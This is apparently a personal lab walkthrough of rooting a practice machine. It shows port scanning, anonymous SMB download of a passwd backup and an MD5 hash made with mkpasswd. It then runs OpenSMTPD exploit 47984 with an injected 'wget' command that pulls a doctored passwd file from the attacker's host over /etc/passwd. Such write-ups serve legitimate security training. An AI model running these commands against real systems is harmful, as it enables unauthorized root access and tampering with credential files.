#### Tags
- Foothold: #smtp #opensmtpd #exploit-47984 #passwd #mkpasswd
#### Method

>[!code]- Find open ports (22, 25, 80, 445)
>**All open ports**
>- rustscan -a $ip
>
>![Pasted image 20240614052520](Images/Pasted%20image%2020240614052520.png)
>
>___
>
>**Versions**
>- OpenSMTPD running on port 25
>  
> ![Pasted image 20240614053037](Images/Pasted%20image%2020240614053037.png)

>[!code]- Obtain `passwd.bak` from the SMB share (port 445)
>List shares:
>- **-N** for no password (anonymous access)
>- **-L** to list available share
>
>![Pasted image 20240614052744](Images/Pasted%20image%2020240614052744.png)
>
>___
>
>Connect to the **backup** share and download the **passwd.bak** file
>![Pasted image 20240614052852](Images/Pasted%20image%2020240614052852.png)
>
>>[!code] passwd.bak
>>![Pasted image 20240614052952](Images/Pasted%20image%2020240614052952.png)
>

>[!code]- Find an OpenSMTPD exploit (port 25)
>Searchsploit OpenSMPTD
>![Pasted image 20240614053211](Images/Pasted%20image%2020240614053211.png)

>[!exploit]- The exploit allows for RCE; we can upload a malicious copy of `/etc/passwd`

>[!code]- Alter the download `passwd.bak` file to include a malicious **root** user
>Create a new hash of a password that we know:
>```bash
>mkpasswd -m md5 -s
>```
>![Pasted image 20240614053712](Images/Pasted%20image%2020240614053712.png)
>
>___
>
>Edit **passwd.bak** and edit the root user within it:
>![Pasted image 20240614053841](Images/Pasted%20image%2020240614053841.png)

>[!code]- Use the exploit to replace its original passwd file with our malicious `passwd.bak` file
>```bash
>python 47984.py 192.168.236.71 25 'wget 192.168.45.213/passwd -O /etc/passwd'
>```
>![Pasted image 20240614054054](Images/Pasted%20image%2020240614054054.png)

>[!code]- SSH to the victim as root using the password in the malicious `passwd` file
>![Pasted image 20240614054235](Images/Pasted%20image%2020240614054235.png)

>[!success]- Obtain proof.txt
>![Pasted image 20240614054309](Images/Pasted%20image%2020240614054309.png)

